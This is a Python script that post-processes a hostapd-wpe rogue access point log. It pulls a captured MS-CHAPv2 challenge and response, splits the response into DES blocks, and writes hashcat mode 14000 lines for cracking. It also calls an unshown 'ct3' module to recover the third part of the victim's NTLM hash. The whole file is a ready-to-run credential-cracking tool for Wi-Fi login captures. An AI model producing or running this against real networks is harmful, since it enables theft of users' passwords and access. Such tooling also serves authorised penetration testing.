import re
import ct3

def parse_hostapd_wpe_log(file_path):
    """
    Parses the hostapd-wpe log file to extract MS-CHAPv2 credentials.
    """
    with open(file_path, "r") as file:
        content = file.read()

    # Extract challenge (convert colon-separated hex to normal hex format)
    challenge_match = re.search(r"challenge:\s*([0-9a-fA-F:]+)", content)
    challenge = challenge_match.group(1).replace(":", "").strip() if challenge_match else None

    # Extract response (convert colon-separated hex to normal hex format)
    response_match = re.search(r"response:\s*([0-9a-fA-F:]+)", content)
    response = response_match.group(1).replace(":", "").strip() if response_match else None

    if not challenge or not response or len(response) != 48:
        raise ValueError("Invalid MS-CHAPv2 challenge/response format.")

    return challenge, response

def extract_des_blocks(response):
    """
    Extracts three 8-byte DES encrypted blocks from the 24-byte response.
    """
    
    enc1 = response[0:16]   # First 8-byte block (16 hex chars)
    enc2 = response[16:32] # Second 8-byte block (16 hex chars)
    enc3 = response[32:]   # Third 8-byte block (16 hex chars)
    
    return [enc1, enc2, enc3]

if __name__ == "__main__":
    file_path = "hostapd-wpe.log"  # Change this to your log file path

    try:
        # Extract challenge and response
        challenge, response = parse_hostapd_wpe_log(file_path)

        print(f"Extracted Challenge: {challenge}")
        print(f"Extracted Response: {response}")

        # Extract all three DES-encrypted blocks
        encrypted_blocks = extract_des_blocks(response)

        # Generate Hashcat mode 14000 format for each DES-encrypted block
        hashcat_entries = [f"{challenge}:{block}" for block in encrypted_blocks[0:2]]

        print("\nHashcat Input Format (mode 14000):")
        for entry in hashcat_entries:
            print(entry)

        #ct3 for k3 in encrypted_blocks[3]:
        # CT3 encrypted data, Salt 
        # print(encrypted_blocks[2])
        print("\nReversing the K3 DES...")
        enc3_clear = ct3.recover_key_from_ct3(encrypted_blocks[2], challenge )
        # print(str(enc3_clear))
        print("\nK3 of the NTLM hash was reversed to: " + enc3_clear )

        # Save to file for Hashcat input
        with open("hashcat_14000.txt", "w") as f:
            f.write("\n".join(hashcat_entries) + "\n")

        print("\nSaved to hashcat_14000.txt. Use this with hashcat mode 14000.")
        
    except Exception as e:
        print("Error:", str(e))

